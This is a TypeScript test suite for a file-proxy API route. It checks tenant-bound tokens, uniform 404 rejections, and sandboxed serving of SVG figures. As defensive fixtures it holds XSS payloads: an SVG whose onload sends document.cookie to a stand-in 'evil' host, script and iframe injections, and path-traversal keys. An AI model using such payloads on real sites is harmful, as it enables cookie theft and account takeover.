import { Hono } from "hono";
import { Readable } from "node:stream";
import { beforeEach, describe, expect, it, vi } from "vitest";

const access = vi.hoisted(() => vi.fn());
const open = vi.hoisted(() => vi.fn());
const actor = vi.hoisted(() => ({ current: null as any }));
vi.mock("../services/documents.js", () => ({ userCanAccessArtifactUri: access }));
vi.mock("../lib/artifacts.js", () => ({ openArtifactObject: open }));
vi.mock("../lib/request-actor.js", () => ({
  getRequestActor: () => actor.current,
  actorHasAnyApiKeyScope: (a: any, scopes: string[]) => scopes.some((scope) => (a.apiKey.scopes ?? []).includes(scope)),
}));

const { filesRoutes } = await import("../routes/files.js");
const { resetFileTokenKeyForTests, sealFileToken } = await import("../lib/file-tokens.js");

const uri = "s3://bucket/user/run/images/doc/page-0001.png";
const session = { type: "session", userId: "user-a", sessionId: "sess-1" };
const app = new Hono().route("/v1/files", filesRoutes);

function token(overrides: Record<string, unknown> = {}) {
  return sealFileToken({ uri, sub: "user-a", bind: "s:sess-1", exp: Math.floor(Date.now() / 1000) + 600, name: "page-0001.png", ...overrides } as never);
}
function object(body = "PNGDATA", extra: Record<string, unknown> = {}) {
  return { Body: Readable.from([Buffer.from(body)]), ContentType: "image/png", ContentLength: body.length, ETag: '"abc"', LastModified: new Date("2026-01-01T00:00:00Z"), ...extra };
}
const get = (path: string, headers: Record<string, string> = {}) => app.request(path, { headers });

describe("file proxy", () => {
  beforeEach(() => {
    process.env.SECRETS_ENCRYPTION_KEY = "d".repeat(64);
    resetFileTokenKeyForTests();
    vi.clearAllMocks();
    actor.current = session;
    access.mockResolvedValue(true);
    open.mockResolvedValue(object());
  });

  it("streams an authorized file with hardened headers", async () => {
    const res = await get(`/v1/files/${token()}/page-0001.png`);
    expect(res.status).toBe(200);
    expect(await res.text()).toBe("PNGDATA");
    expect(access).toHaveBeenCalledWith(uri, "user-a", undefined);
    const h = res.headers;
    expect(h.get("content-type")).toBe("image/png");
    expect(h.get("cache-control")).toBe("private, no-store");
    expect(h.get("x-content-type-options")).toBe("nosniff");
    expect(h.get("cross-origin-resource-policy")).toBe("same-origin");
    expect(h.get("content-security-policy")).toContain("sandbox");
    expect(h.get("content-disposition")).toMatch(/^inline; filename="page-0001.png"/);
    expect(h.get("etag")).toBe('"abc"');
  });

  it("answers the same 404 for every rejection, before touching storage", async () => {
    const cases: Array<[string, () => void]> = [
      ["garbage token", () => {}],
      ["other session", () => { actor.current = { ...session, sessionId: "sess-2" }; }],
      ["other user", () => { actor.current = { ...session, userId: "user-b" }; }],
      ["api key replaying a session token", () => { actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "sess-1", orgId: "org", scopes: ["artifacts"] } }; }],
      ["access revoked", () => { access.mockResolvedValue(false); }],
    ];
    for (const [label, arrange] of cases) {
      actor.current = session; access.mockResolvedValue(true); open.mockClear();
      arrange();
      const path = label === "garbage token" ? "/v1/files/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/page-0001.png" : `/v1/files/${token()}/page-0001.png`;
      const res = await get(path);
      expect(res.status, label).toBe(404);
      expect(res.headers.get("cache-control"), label).toBe("no-store");
      expect(await res.json(), label).toEqual({ error: { code: "not_found", message: "Not found" } });
      expect(open, label).not.toHaveBeenCalled();
    }
  });

  it("rejects expired tokens and a renamed URL suffix", async () => {
    expect((await get(`/v1/files/${token({ exp: Math.floor(Date.now() / 1000) - 1 })}/page-0001.png`)).status).toBe(404);
    expect((await get(`/v1/files/${token()}/other.png`)).status).toBe(404);
    expect(open).not.toHaveBeenCalled();
  });

  it("requires the artifacts scope, binds API key tokens to that key and checks the key's organization", async () => {
    actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-1", orgId: "org-a", scopes: ["search"] } };
    expect((await get(`/v1/files/${token({ bind: "k:key-1" })}/page-0001.png`)).status).toBe(404);
    actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-1", orgId: "org-a", scopes: ["artifacts"] } };
    const res = await get(`/v1/files/${token({ bind: "k:key-1" })}/page-0001.png`);
    expect(res.status).toBe(200);
    expect(access).toHaveBeenCalledWith(uri, "user-a", "org-a");
    actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-2", orgId: "org-a", scopes: ["artifacts"] } };
    expect((await get(`/v1/files/${token({ bind: "k:key-1" })}/page-0001.png`)).status).toBe(404);
  });

  it("passes byte ranges through for media seeking", async () => {
    open.mockResolvedValue(object("PNG", { ContentRange: "bytes 0-2/7", ContentLength: 3 }));
    const res = await get(`/v1/files/${token()}/page-0001.png`, { range: "bytes=0-2" });
    expect(res.status).toBe(206);
    expect(open.mock.calls[0][1].range).toBe("bytes=0-2");
    expect(res.headers.get("content-range")).toBe("bytes 0-2/7");
    await get(`/v1/files/${token()}/page-0001.png`, { range: "bytes=0-2,5-6" });
    expect(open.mock.calls[1][1].range).toBeUndefined();
  });

  it("revalidates with 304 after re-authorizing", async () => {
    open.mockRejectedValue(Object.assign(new Error("Not Modified"), { $metadata: { httpStatusCode: 304 } }));
    const res = await get(`/v1/files/${token()}/page-0001.png`, { "if-none-match": '"abc"' });
    expect(res.status).toBe(304);
    expect(access).toHaveBeenCalled();
    expect(res.headers.get("etag")).toBe('"abc"');
  });

  it("never renders active content on the app origin", async () => {
    for (const type of ["text/html", "image/svg+xml", "application/xhtml+xml", "text/xml"]) {
      open.mockResolvedValue(object("<script>alert(1)</script>", { ContentType: type }));
      const res = await get(`/v1/files/${token({ name: "evil.html" })}/evil.html`);
      expect(res.headers.get("content-type"), type).toBe("application/octet-stream");
      expect(res.headers.get("content-disposition"), type).toMatch(/^attachment;/);
      expect(res.headers.get("content-security-policy"), type).toContain("sandbox");
    }
  });

  describe("Doppler figures", () => {
    const figureUri = (name: string) => `s3://bucket/user-a/run-1/doppler-figures/0b6f7e8c-3c1a-4f7e-9a51-2a1d3e4f5a6b/${name}`;
    const figureToken = (name: string, overrides: Record<string, unknown> = {}) => token({ uri: figureUri(name), name, ...overrides });

    it("serves an SVG figure inline with a fixed type and a CSP that loads and runs nothing", async () => {
      open.mockResolvedValue(object('<svg xmlns="http://www.w3.org/2000/svg"/>', { ContentType: "text/html" }));
      const res = await get(`/v1/files/${figureToken("p3.g2.svg")}/p3.g2.svg`);
      expect(res.status).toBe(200);
      expect(access).toHaveBeenCalledWith(figureUri("p3.g2.svg"), "user-a", undefined);
      expect(res.headers.get("content-type")).toBe("image/svg+xml");
      expect(res.headers.get("content-security-policy")).toBe("default-src 'none'; style-src 'unsafe-inline'; sandbox; frame-ancestors 'self'");
      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
      expect(res.headers.get("content-disposition")).toMatch(/^inline; filename="p3.g2.svg"/);
      expect(res.headers.get("cache-control")).toBe("private, no-store");
    });

    it("serves an SVG figure that carries script (a compromised converter) only under the sandbox CSP", async () => {
      // The VM's SVG allowlist is a correctness filter, not the boundary: if a decoder bug let a figure through with
      // script, the response itself must keep it inert (no script, no network, sandboxed, never sniffed as HTML).
      const hostile = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil/\'+document.cookie)"><script>alert(1)</script><foreignObject><iframe src="https://evil/"/></foreignObject></svg>';
      open.mockResolvedValue(object(hostile, { ContentType: "text/html" }));
      const res = await get(`/v1/files/${figureToken("p3.g2.svg")}/p3.g2.svg`);
      expect(res.status).toBe(200);
      expect(res.headers.get("content-type")).toBe("image/svg+xml");
      const csp = res.headers.get("content-security-policy") ?? "";
      expect(csp.split(";").map((d) => d.trim())).toEqual(expect.arrayContaining(["default-src 'none'", "sandbox", "frame-ancestors 'self'"]));
      // Only the same-origin inspector may frame it: no other site can embed the figure under the app origin.
      expect(res.headers.get("x-frame-options")).toBe("SAMEORIGIN");
      expect(csp).not.toMatch(/script-src|allow-scripts|connect-src|frame-src|'unsafe-eval'/);
      expect(res.headers.get("x-content-type-options")).toBe("nosniff");
    });

    it("fixes raster figure types from the key, whatever storage says", async () => {
      for (const [name, type] of [["p3.1.webp", "image/webp"], ["p4.g1.png", "image/png"]] as const) {
        open.mockResolvedValue(object("bytes", { ContentType: "text/html" }));
        const res = await get(`/v1/files/${figureToken(name)}/${name}`);
        expect(res.headers.get("content-type"), name).toBe(type);
        expect(res.headers.get("content-security-policy"), name).toContain("sandbox");
        expect(res.headers.get("x-content-type-options"), name).toBe("nosniff");
      }
    });

    it("renders no other SVG: a look-alike key outside the figure layout stays an attachment", async () => {
      for (const key of ["user-a/run-1/doppler-figures/doc/../p3.g2.svg", "user-a/run-1/uploads/p3.g2.svg", "user-a/run-1/doppler-figures/doc/evil.svg", "user-a/run-1/doppler-figures/doc/p3.g2.svg.html"]) {
        open.mockResolvedValue(object("<svg/>", { ContentType: "image/svg+xml" }));
        const res = await get(`/v1/files/${token({ uri: `s3://bucket/${key}`, name: "p3.g2.svg" })}/p3.g2.svg`);
        expect(res.headers.get("content-type"), key).toBe("application/octet-stream");
        expect(res.headers.get("content-disposition"), key).toMatch(/^attachment;/);
      }
    });

    it("applies the same tenant checks: another tenant, a revoked document, a wrong-scope or other key all get 404", async () => {
      const path = (overrides: Record<string, unknown> = {}) => `/v1/files/${figureToken("p3.g2.svg", overrides)}/p3.g2.svg`;
      actor.current = { ...session, userId: "user-b", sessionId: "sess-1" };
      expect((await get(path())).status).toBe(404);
      actor.current = session;
      access.mockResolvedValue(false); // another tenant's figure, or access revoked since the URL was issued
      expect((await get(path())).status).toBe(404);
      access.mockResolvedValue(true);
      actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-1", orgId: "org-a", scopes: ["search"] } };
      expect((await get(path({ bind: "k:key-1" }))).status).toBe(404);
      actor.current = { type: "apiKey", userId: "user-a", apiKey: { keyId: "key-2", orgId: "org-a", scopes: ["artifacts"] } };
      expect((await get(path({ bind: "k:key-1" }))).status).toBe(404);
      expect(open).not.toHaveBeenCalled();
    });
  });

  it("maps a missing object to 404", async () => {
    open.mockRejectedValue(Object.assign(new Error("NoSuchKey"), { $metadata: { httpStatusCode: 404 } }));
    expect((await get(`/v1/files/${token()}/page-0001.png`)).status).toBe(404);
  });
});
